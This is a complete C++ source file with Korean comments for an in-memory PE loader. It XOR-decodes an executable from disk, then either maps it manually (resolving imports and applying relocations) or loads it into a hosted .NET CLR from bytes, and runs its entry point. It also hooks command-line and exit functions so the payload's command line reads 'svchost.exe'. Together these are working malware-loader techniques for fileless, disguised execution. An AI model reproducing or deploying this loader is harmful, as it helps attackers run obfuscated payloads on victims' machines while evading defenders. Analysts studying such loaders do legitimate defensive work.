/*
 * PE Loader - Native + Managed (In-Memory CLR) 통합본 v3
 *
 * ILRepack 결과물 대응:
 *  - managed PE는 수동 매핑하지 않고 CLR Assembly.Load(byte[]) 사용
 *  - relocation/ImageBase와 무관하게 메모리 바이트에서 EntryPoint 호출
 *  - native PE는 기존 수동 매핑 경로 유지
 */

#define _CRT_RAND_S
#define WIN32_LEAN_AND_MEAN
#include <Windows.h>
#include <Shellapi.h>
#include <stdio.h>
#include <stdlib.h>
#include <vector>
#include <psapi.h>
#include <winternl.h>
#include <metahost.h>
#include <mscoree.h>
#include <oleauto.h>

#pragma comment(lib, "mscoree.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")
#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "shell32.lib")
#pragma warning(disable: 4996)

// ============================================================
// 구조체
// ============================================================
struct DATA {
    LPVOID data;
    size_t len;
};

// ============================================================
// 커맨드라인 위장
// ============================================================
BOOL      hijackCmdline    = FALSE;
char*     sz_masqCmd_Ansi  = NULL;
wchar_t*  sz_masqCmd_Widh  = NULL;
wchar_t** poi_masqArgvW    = NULL;
char**    poi_masqArgvA    = NULL;
int       int_masqCmd_Argc = 0;

LPWSTR     hookGetCommandLineW() { return sz_masqCmd_Widh; }
LPSTR      hookGetCommandLineA() { return sz_masqCmd_Ansi; }
char***    __cdecl hook__p___argv()  { return &poi_masqArgvA; }
wchar_t*** __cdecl hook__p___wargv() { return &poi_masqArgvW; }
int*       __cdecl hook__p___argc()  { return &int_masqCmd_Argc; }

int hook__wgetmainargs(int* _Argc, wchar_t*** _Argv, wchar_t***, int, void*)
{ *_Argc = int_masqCmd_Argc; *_Argv = poi_masqArgvW; return 0; }
int hook__getmainargs(int* _Argc, char*** _Argv, char***, int, void*)
{ *_Argc = int_masqCmd_Argc; *_Argv = poi_masqArgvA; return 0; }

_onexit_t __cdecl hook_onexit(_onexit_t)          { return 0; }
int       __cdecl hookatexit(void(__cdecl*)(void)) { return 0; }
void      __cdecl hookexit(int)                    { ExitThread(0); }
void   __stdcall hookExitProcess(UINT)             { ExitThread(0); }

static void MasqueradeCmdline(const char* cmdline)
{
    sz_masqCmd_Ansi = _strdup(cmdline);
    int req = MultiByteToWideChar(CP_UTF8, 0, sz_masqCmd_Ansi, -1, NULL, 0);
    sz_masqCmd_Widh = (wchar_t*)calloc((size_t)req + 1, sizeof(wchar_t));
    if (!sz_masqCmd_Widh) return;
    MultiByteToWideChar(CP_UTF8, 0, sz_masqCmd_Ansi, -1, sz_masqCmd_Widh, req);
    poi_masqArgvW = CommandLineToArgvW(sz_masqCmd_Widh, &int_masqCmd_Argc);

    int memsz = int_masqCmd_Argc * sizeof(LPSTR);
    for (int i = 0; i < int_masqCmd_Argc; i++)
        memsz += WideCharToMultiByte(CP_UTF8, 0, poi_masqArgvW[i], -1, NULL, 0, NULL, NULL);
    poi_masqArgvA = (LPSTR*)LocalAlloc(LMEM_FIXED, memsz);
    if (!poi_masqArgvA) return;

    int   bufLen = memsz - int_masqCmd_Argc * sizeof(LPSTR);
    LPSTR buf    = ((LPSTR)poi_masqArgvA) + int_masqCmd_Argc * sizeof(LPSTR);
    for (int i = 0; i < int_masqCmd_Argc; i++) {
        int r = WideCharToMultiByte(CP_UTF8, 0, poi_masqArgvW[i], -1, buf, bufLen, NULL, NULL);
        poi_masqArgvA[i] = buf; buf += r; bufLen -= r;
    }
    hijackCmdline = TRUE;
}

// ============================================================
// PE 헬퍼
// ============================================================
static IMAGE_NT_HEADERS* GetNTHeaders(void* base)
{
    if (!base) return NULL;
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)base;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE)         return NULL;
    if (dos->e_lfanew <= 0 || dos->e_lfanew > 1024) return NULL;
    IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)((BYTE*)base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE)         return NULL;
    return nt;
}

static bool IsManagedPE(const void* base, size_t size)
{
    if (!base || size < sizeof(IMAGE_DOS_HEADER)) return false;

    const BYTE* bytes = (const BYTE*)base;
    const IMAGE_DOS_HEADER* dos = (const IMAGE_DOS_HEADER*)bytes;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE || dos->e_lfanew <= 0) return false;

    size_t ntOffset = (size_t)dos->e_lfanew;
    if (ntOffset > size || size - ntOffset <
        sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER) + sizeof(WORD)) return false;
    if (*(const DWORD*)(bytes + ntOffset) != IMAGE_NT_SIGNATURE) return false;

    const IMAGE_NT_HEADERS32* nt32 =
        (const IMAGE_NT_HEADERS32*)(bytes + ntOffset);
    WORD magic = nt32->OptionalHeader.Magic;
    const IMAGE_DATA_DIRECTORY* clrDir = NULL;

    if (magic == IMAGE_NT_OPTIONAL_HDR32_MAGIC) {
        if (size - ntOffset < sizeof(IMAGE_NT_HEADERS32) ||
            nt32->OptionalHeader.NumberOfRvaAndSizes <=
                IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR) return false;
        clrDir = &nt32->OptionalHeader.DataDirectory[
            IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR];
    } else if (magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
        if (size - ntOffset < sizeof(IMAGE_NT_HEADERS64)) return false;
        const IMAGE_NT_HEADERS64* nt64 =
            (const IMAGE_NT_HEADERS64*)(bytes + ntOffset);
        if (nt64->OptionalHeader.NumberOfRvaAndSizes <=
            IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR) return false;
        clrDir = &nt64->OptionalHeader.DataDirectory[
            IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR];
    } else {
        return false;
    }

    return clrDir->VirtualAddress != 0 &&
           clrDir->Size >= sizeof(IMAGE_COR20_HEADER);
}

static bool HasReloc(void* base)
{
    IMAGE_NT_HEADERS* nt = GetNTHeaders(base);
    if (!nt) return false;
    IMAGE_DATA_DIRECTORY* dir =
        &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    return (dir->VirtualAddress != 0 && dir->Size != 0);
}

// ============================================================
// IAT 복구
// ============================================================
static bool RepairIAT(PVOID modulePtr)
{
    IMAGE_NT_HEADERS* nt = GetNTHeaders(modulePtr);
    if (!nt) return false;

    IMAGE_DATA_DIRECTORY* importsDir =
        &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (!importsDir->VirtualAddress) return true;

    size_t maxSize = importsDir->Size;
    size_t impAddr = importsDir->VirtualAddress;
    size_t parsed  = 0;

    while (parsed < maxSize)
    {
        IMAGE_IMPORT_DESCRIPTOR* lib =
            (IMAGE_IMPORT_DESCRIPTOR*)((ULONG_PTR)modulePtr + impAddr + parsed);
        if (!lib->OriginalFirstThunk && !lib->FirstThunk) break;

        LPSTR   libName = (LPSTR)((ULONG_PTR)modulePtr + lib->Name);
        HMODULE hLib    = LoadLibraryA(libName);

        size_t callVia   = lib->FirstThunk;
        size_t thunkAddr = lib->OriginalFirstThunk
            ? lib->OriginalFirstThunk : lib->FirstThunk;
        size_t offField  = 0, offThunk = 0;

        while (true)
        {
            IMAGE_THUNK_DATA* field =
                (IMAGE_THUNK_DATA*)((ULONG_PTR)modulePtr + offField + callVia);
            IMAGE_THUNK_DATA* orig  =
                (IMAGE_THUNK_DATA*)((ULONG_PTR)modulePtr + offThunk + thunkAddr);
            if (!orig->u1.AddressOfData) break;

            if (IMAGE_SNAP_BY_ORDINAL(orig->u1.Ordinal)) {
                ULONG_PTR ord = orig->u1.Ordinal & 0xFFFF;
                field->u1.Function = hLib
                    ? (ULONG_PTR)GetProcAddress(hLib, (LPCSTR)ord) : 0;
            } else if (field->u1.Function == orig->u1.Function) {
                PIMAGE_IMPORT_BY_NAME ibn =
                    (PIMAGE_IMPORT_BY_NAME)((ULONG_PTR)modulePtr + orig->u1.AddressOfData);
                LPSTR     funcName = (LPSTR)ibn->Name;
                ULONG_PTR addr     = hLib
                    ? (ULONG_PTR)GetProcAddress(hLib, funcName) : 0;

                if (hijackCmdline) {
                    struct { const char* name; ULONG_PTR hook; } hooks[] = {
                        { "GetCommandLineA", (ULONG_PTR)hookGetCommandLineA },
                        { "GetCommandLineW", (ULONG_PTR)hookGetCommandLineW },
                        { "__wgetmainargs",  (ULONG_PTR)hook__wgetmainargs  },
                        { "__getmainargs",   (ULONG_PTR)hook__getmainargs   },
                        { "__p___argv",      (ULONG_PTR)hook__p___argv      },
                        { "__p___wargv",     (ULONG_PTR)hook__p___wargv     },
                        { "__p___argc",      (ULONG_PTR)hook__p___argc      },
                        { "exit",            (ULONG_PTR)hookexit            },
                        { "_Exit",           (ULONG_PTR)hookexit            },
                        { "_exit",           (ULONG_PTR)hookexit            },
                        { "quick_exit",      (ULONG_PTR)hookexit            },
                        { "ExitProcess",     (ULONG_PTR)hookExitProcess     },
                    };
                    for (auto& h : hooks)
                        if (_stricmp(funcName, h.name) == 0) { addr = h.hook; break; }
                }
                field->u1.Function = addr;
            }
            offField += sizeof(IMAGE_THUNK_DATA);
            offThunk += sizeof(IMAGE_THUNK_DATA);
        }
        parsed += sizeof(IMAGE_IMPORT_DESCRIPTOR);
    }
    return true;
}

// ============================================================
// Base Relocation
// ============================================================
static void ApplyRelocations(BYTE* imageBase, IMAGE_NT_HEADERS* nt, ULONG_PTR delta)
{
    IMAGE_DATA_DIRECTORY* dir =
        &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    if (!dir->VirtualAddress || !delta) return;

    PIMAGE_BASE_RELOCATION reloc =
        (PIMAGE_BASE_RELOCATION)(imageBase + dir->VirtualAddress);
    BYTE* end = (BYTE*)reloc + dir->Size;

    while ((BYTE*)reloc < end && reloc->SizeOfBlock >= sizeof(IMAGE_BASE_RELOCATION))
    {
        DWORD count   = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
        WORD* entries = (WORD*)((BYTE*)reloc + sizeof(IMAGE_BASE_RELOCATION));
        for (DWORD i = 0; i < count; i++) {
            WORD type   = entries[i] >> 12;
            WORD offset = entries[i] & 0x0FFF;
            if (type == IMAGE_REL_BASED_ABSOLUTE) continue;
            ULONG_PTR* patch =
                (ULONG_PTR*)(imageBase + reloc->VirtualAddress + offset);
#ifdef _WIN64
            if (type == IMAGE_REL_BASED_DIR64)   *patch += delta;
#else
            if (type == IMAGE_REL_BASED_HIGHLOW)  *patch += delta;
#endif
        }
        reloc = (PIMAGE_BASE_RELOCATION)((BYTE*)reloc + reloc->SizeOfBlock);
    }
}

// ============================================================
// 섹션 특성 -> 페이지 보호
// ============================================================
static DWORD SectionCharToProtect(DWORD ch)
{
    bool exec  = (ch & IMAGE_SCN_MEM_EXECUTE) != 0;
    bool write = (ch & IMAGE_SCN_MEM_WRITE)   != 0;
    bool read  = (ch & IMAGE_SCN_MEM_READ)    != 0;
    if (exec && write) return PAGE_EXECUTE_READWRITE;
    if (exec && read)  return PAGE_EXECUTE_READ;
    if (exec)          return PAGE_EXECUTE;
    if (write && read) return PAGE_READWRITE;
    if (read)          return PAGE_READONLY;
    return PAGE_NOACCESS;
}

// ============================================================
// XOR 복호화 + 파일 로드
// ============================================================
static void XorData(DATA* d, BYTE key)
{
    if (!d || !d->data || !d->len) return;
    BYTE* buf = (BYTE*)d->data;
    for (size_t i = 0; i < d->len; i++) buf[i] ^= key;
}

static DATA LoadFromFile(const char* path)
{
    DATA result = { NULL, 0 };
    FILE* fp = fopen(path, "rb");
    if (!fp) { printf("[-] File open failed: %s\n", path); return result; }
    fseek(fp, 0, SEEK_END);
    long sz = ftell(fp);
    if (sz <= 0) { fclose(fp); return result; }
    fseek(fp, 0, SEEK_SET);
    result.data = malloc((size_t)sz);
    if (!result.data) { fclose(fp); return result; }
    size_t rd = fread(result.data, 1, (size_t)sz, fp);
    fclose(fp);
    if (rd != (size_t)sz) { free(result.data); result.data = NULL; return result; }
    result.len = (size_t)sz;
    XorData(&result, 0x55);
    return result;
}

// ============================================================
// PE 매핑 공통 함수
//
// Native PE 전용: reloc 없으면 preferred 실패 시 abort
// ============================================================
static BYTE* MapPE(char* data, DWORD datasize)
{
    IMAGE_NT_HEADERS* nt = GetNTHeaders(data);
    if (!nt) { printf("[-] NT header parse failed\n"); return NULL; }

    DWORD sizeOfImage   = nt->OptionalHeader.SizeOfImage;
    DWORD sizeOfHeaders = nt->OptionalHeader.SizeOfHeaders;
    if (!sizeOfImage) { printf("[-] SizeOfImage == 0\n"); return NULL; }

    LPVOID preferAddr = (LPVOID)nt->OptionalHeader.ImageBase;
    printf("[*] Preferred ImageBase: %p  SizeOfImage: 0x%X\n", preferAddr, sizeOfImage);

    // 1차: preferred 주소 시도
    BYTE* imageBase = (BYTE*)VirtualAlloc(preferAddr, sizeOfImage,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (!imageBase) {
        printf("[!] Preferred addr alloc failed\n");
        bool hasReloc = HasReloc(data);

        if (!hasReloc) {
            // reloc 없음 -> 주소 불일치 실행 불가
            printf("[-] No reloc, cannot rebase native PE -> abort\n");
            return NULL;
        }

        // reloc 있으면 임의 주소에 할당
        imageBase = (BYTE*)VirtualAlloc(NULL, sizeOfImage,
            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!imageBase) { printf("[-] VirtualAlloc failed\n"); return NULL; }
        printf("[!] Mapped at random addr: %p\n", imageBase);
    } else {
        printf("[+] Mapped at preferred addr: %p\n", imageBase);
    }

    // 헤더 복사
    memcpy(imageBase, data, sizeOfHeaders);

    // 섹션 복사
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (!sec[i].SizeOfRawData) continue;
        DWORD vSize   = sec[i].Misc.VirtualSize;
        DWORD rawSize = sec[i].SizeOfRawData;
        DWORD copy    = (vSize > 0) ? min(rawSize, vSize) : rawSize;
        if ((DWORD64)sec[i].PointerToRawData + copy > datasize ||
            (DWORD64)sec[i].VirtualAddress   + copy > sizeOfImage) {
            printf("[-] Section %d OOB, skipping\n", i); continue;
        }
        memcpy(imageBase + sec[i].VirtualAddress,
               data + sec[i].PointerToRawData, copy);
    }

    // Relocation (가능한 경우만)
    ULONG_PTR delta = (ULONG_PTR)imageBase
                    - (ULONG_PTR)nt->OptionalHeader.ImageBase;
    if (delta && HasReloc(data)) {
        printf("[*] Applying relocations, delta: 0x%llX\n", (unsigned long long)delta);
        ApplyRelocations(imageBase, nt, delta);
    }

    // 매핑된 NT 헤더의 ImageBase 갱신 (CLR/_CorExeMain 참조)
    IMAGE_NT_HEADERS* ntMapped = GetNTHeaders(imageBase);
    if (ntMapped)
        ntMapped->OptionalHeader.ImageBase = (ULONG_PTR)imageBase;

    return imageBase;
}

// ============================================================
// [Managed 경로] CLR Assembly.Load(byte[])
//
// 관리형 PE는 네이티브 이미지처럼 VirtualAlloc/relocation 하지 않는다.
// CLR의 기본 AppDomain에 원본 바이트를 직접 로드한 뒤 EntryPoint를
// reflection으로 호출한다. 따라서 ILRepack 결과물에 relocation
// directory가 없어도 ImageBase와 무관하게 실행된다.
// ============================================================
static const GUID IID_AppDomain_ =
    { 0x05F696DC, 0x2B29, 0x3663,
      { 0xAD, 0x8B, 0xC4, 0x38, 0x9C, 0xF2, 0xA7, 0x13 } };

struct CLR_HOST_STATE {
    ICLRMetaHost* meta;
    ICLRRuntimeInfo* info;
    ICorRuntimeHost* host;
    IUnknown* domainUnknown;
    IDispatch* domain;
    bool comInitialized;
    bool runtimeStarted;
};

static void* InterfaceMethod(void* object, size_t index)
{
    return (*(void***)object)[index];
}

static void CloseCLRHost(CLR_HOST_STATE* state)
{
    if (!state) return;
    if (state->domain) state->domain->Release();
    if (state->domainUnknown) state->domainUnknown->Release();
    if (state->runtimeStarted && state->host) state->host->Stop();
    if (state->host) state->host->Release();
    if (state->info) state->info->Release();
    if (state->meta) state->meta->Release();
    if (state->comInitialized) CoUninitialize();
    ZeroMemory(state, sizeof(*state));
}

static HRESULT OpenCLRHost(CLR_HOST_STATE* state)
{
    if (!state) return E_POINTER;
    ZeroMemory(state, sizeof(*state));

    HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    if (SUCCEEDED(hr)) {
        state->comInitialized = true;
    } else if (hr != RPC_E_CHANGED_MODE) {
        return hr;
    }

    hr = CLRCreateInstance(CLSID_CLRMetaHost, IID_ICLRMetaHost,
                           (LPVOID*)&state->meta);
    if (FAILED(hr)) return hr;

    hr = state->meta->GetRuntime(L"v4.0.30319", IID_ICLRRuntimeInfo,
                                 (LPVOID*)&state->info);
    if (FAILED(hr)) return hr;

    BOOL loadable = FALSE;
    hr = state->info->IsLoadable(&loadable);
    if (FAILED(hr) || !loadable) return FAILED(hr) ? hr : E_FAIL;

    hr = state->info->GetInterface(CLSID_CorRuntimeHost,
                                   IID_ICorRuntimeHost,
                                   (LPVOID*)&state->host);
    if (FAILED(hr)) return hr;

    hr = state->host->Start();
    if (FAILED(hr)) return hr;
    state->runtimeStarted = true;

    hr = state->host->GetDefaultDomain(&state->domainUnknown);
    if (FAILED(hr)) return hr;

    return state->domainUnknown->QueryInterface(
        IID_AppDomain_, (void**)&state->domain);
}

static HRESULT LoadAssemblyFromBytes(IDispatch* domain,
                                     const BYTE* data,
                                     ULONG size,
                                     IDispatch** assembly)
{
    typedef HRESULT(STDMETHODCALLTYPE* AppDomainLoad3)(
        void*, SAFEARRAY*, void**);

    if (!domain || !data || !size || !assembly) return E_INVALIDARG;
    *assembly = NULL;

    SAFEARRAY* bytes = SafeArrayCreateVector(VT_UI1, 0, size);
    if (!bytes) return E_OUTOFMEMORY;

    BYTE* destination = NULL;
    HRESULT hr = SafeArrayAccessData(bytes, (void**)&destination);
    if (SUCCEEDED(hr)) {
        memcpy(destination, data, size);
        SafeArrayUnaccessData(bytes);
        destination = NULL;

        // _AppDomain: IUnknown(3), IDispatch(4), Load_3 = vtable slot 45.
        AppDomainLoad3 load3 =
            (AppDomainLoad3)InterfaceMethod(domain, 45);
        hr = load3(domain, bytes, (void**)assembly);
    }

    if (destination) SafeArrayUnaccessData(bytes);
    SafeArrayDestroy(bytes);
    return hr;
}

static HRESULT GetAssemblyEntryPoint(IDispatch* assembly,
                                     IDispatch** method)
{
    typedef HRESULT(STDMETHODCALLTYPE* AssemblyGetEntryPoint)(
        void*, void**);
    if (!assembly || !method) return E_INVALIDARG;
    *method = NULL;

    // _Assembly: get_EntryPoint = vtable slot 16.
    AssemblyGetEntryPoint getEntry =
        (AssemblyGetEntryPoint)InterfaceMethod(assembly, 16);
    return getEntry(assembly, (void**)method);
}

static HRESULT BuildMainParameters(bool withStringArray,
                                   SAFEARRAY** parameters)
{
    if (!parameters) return E_POINTER;
    *parameters = SafeArrayCreateVector(
        VT_VARIANT, 0, withStringArray ? 1 : 0);
    if (!*parameters) return E_OUTOFMEMORY;
    if (!withStringArray) return S_OK;

    SAFEARRAY* args = SafeArrayCreateVector(VT_BSTR, 0, 0);
    if (!args) {
        SafeArrayDestroy(*parameters);
        *parameters = NULL;
        return E_OUTOFMEMORY;
    }

    VARIANT argument;
    VariantInit(&argument);
    V_VT(&argument) = VT_ARRAY | VT_BSTR;
    V_ARRAY(&argument) = args;
    LONG index = 0;
    HRESULT hr = SafeArrayPutElement(*parameters, &index, &argument);
    VariantClear(&argument); // SafeArrayPutElement made its own copy.
    if (FAILED(hr)) {
        SafeArrayDestroy(*parameters);
        *parameters = NULL;
    }
    return hr;
}

static HRESULT InvokeManagedMain(IDispatch* method,
                                 bool withStringArray,
                                 LONG* managedResult)
{
    typedef HRESULT(STDMETHODCALLTYPE* MethodInvoke3)(
        void*, VARIANT, SAFEARRAY*, VARIANT*);
    if (!method || !managedResult) return E_INVALIDARG;
    *managedResult = 0;

    SAFEARRAY* parameters = NULL;
    HRESULT hr = BuildMainParameters(withStringArray, &parameters);
    if (FAILED(hr)) return hr;

    VARIANT target;
    VARIANT result;
    VariantInit(&target);
    VariantInit(&result);
    V_VT(&target) = VT_NULL; // static Main

    // _MethodInfo: Invoke_3 = vtable slot 37.
    MethodInvoke3 invoke3 = (MethodInvoke3)InterfaceMethod(method, 37);
    hr = invoke3(method, target, parameters, &result);
    if (SUCCEEDED(hr)) {
        if (V_VT(&result) == VT_EMPTY || V_VT(&result) == VT_NULL) {
            *managedResult = 0; // void Main()
        } else {
            VARIANT converted;
            VariantInit(&converted);
            hr = VariantChangeType(&converted, &result, 0, VT_I4);
            if (SUCCEEDED(hr)) *managedResult = V_I4(&converted);
            VariantClear(&converted);
        }
    }

    VariantClear(&result);
    SafeArrayDestroy(parameters);
    return hr;
}

static bool RunManaged(char* data, DWORD datasize)
{
    printf("[*] Managed PE - loading through CLR Assembly.Load(byte[])...\n");
    printf("[*] Relocations/ImageBase are not used for managed loading\n");

    CLR_HOST_STATE state = {};
    IDispatch* assembly = NULL;
    IDispatch* entryPoint = NULL;
    LONG managedResult = 0;

    HRESULT hr = OpenCLRHost(&state);
    if (FAILED(hr)) {
        printf("[-] CLR v4 initialization failed: 0x%08lX\n",
               (unsigned long)hr);
        goto cleanup;
    }
    printf("[+] CLR v4 started\n");

    hr = LoadAssemblyFromBytes(state.domain, (const BYTE*)data,
                               datasize, &assembly);
    if (FAILED(hr)) {
        printf("[-] Assembly.Load(byte[]) failed: 0x%08lX\n",
               (unsigned long)hr);
        printf("[-] Check target architecture and .NET Framework version\n");
        goto cleanup;
    }

    hr = GetAssemblyEntryPoint(assembly, &entryPoint);
    if (FAILED(hr) || !entryPoint) {
        printf("[-] Managed assembly has no executable entry point: 0x%08lX\n",
               (unsigned long)hr);
        goto cleanup;
    }

    // Main() / Main(string[] args) 모두 지원한다.
    fflush(stdout);
    hr = InvokeManagedMain(entryPoint, false, &managedResult);
    if (hr == DISP_E_BADPARAMCOUNT) {
        hr = InvokeManagedMain(entryPoint, true, &managedResult);
    }
    if (FAILED(hr)) {
        printf("[-] Managed entry point failed: 0x%08lX\n",
               (unsigned long)hr);
        goto cleanup;
    }

    printf("[+] Managed entry point returned: %ld\n", managedResult);

cleanup:
    if (entryPoint) entryPoint->Release();
    if (assembly) assembly->Release();
    CloseCLRHost(&state);
    return SUCCEEDED(hr);
}

// ============================================================
// [Native 경로] RunNative
// ============================================================
static void RunNative(char* data, DWORD datasize)
{
    BYTE* imageBase = MapPE(data, datasize);
    if (!imageBase) return;

    IMAGE_NT_HEADERS* nt = GetNTHeaders(imageBase);

    if (!RepairIAT(imageBase)) {
        printf("[-] IAT repair failed\n");
        VirtualFree(imageBase, 0, MEM_RELEASE); return;
    }

    printf("[*] Applying section permissions...\n");
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (!sec[i].Misc.VirtualSize) continue;
        DWORD prot = SectionCharToProtect(sec[i].Characteristics);
        DWORD old  = 0;
        VirtualProtect(imageBase + sec[i].VirtualAddress,
                       sec[i].Misc.VirtualSize, prot, &old);
        printf("[+] Section %-8.8s -> 0x%02X\n", (char*)sec[i].Name, prot);
    }

    DWORD sizeOfImage = nt->OptionalHeader.SizeOfImage;
    DWORD epRva       = nt->OptionalHeader.AddressOfEntryPoint;
    if (epRva >= sizeOfImage) {
        printf("[-] Invalid EP RVA: 0x%X\n", epRva);
        VirtualFree(imageBase, 0, MEM_RELEASE); return;
    }

    void* ep = imageBase + epRva;
    printf("[+] Entry Point: %p\n", ep);
    typedef void(*pEP)();
    ((pEP)ep)();

    VirtualFree(imageBase, 0, MEM_RELEASE);
}

// ============================================================
// main
// ============================================================
int main(int argc, char** argv)
{
    if (argc < 3 || _stricmp(argv[1], "file") != 0) {
        printf("[+] Usage: %s file <PE path>\n", argv[0]);
        return 1;
    }

    MasqueradeCmdline("svchost.exe");

    printf("[*] Loading: %s\n", argv[2]);
    DATA pe = LoadFromFile(argv[2]);
    if (!pe.data || pe.len == 0) {
        printf("[-] Failed to load PE\n"); return 1;
    }
    printf("[+] PE size: %zu bytes\n", pe.len);

    if (pe.len > MAXDWORD) {
        printf("[-] PE is too large for this loader\n");
        free(pe.data);
        return 1;
    }

    bool ok = true;
    if (IsManagedPE(pe.data, pe.len)) {
        printf("[*] -> Managed (.NET) PE\n");
        ok = RunManaged((char*)pe.data, (DWORD)pe.len);
    } else {
        printf("[*] -> Native PE\n");
        RunNative((char*)pe.data, (DWORD)pe.len);
    }

    free(pe.data);
    printf(ok ? "[+] Done\n" : "[-] Failed\n");
    return ok ? 0 : 2;
}
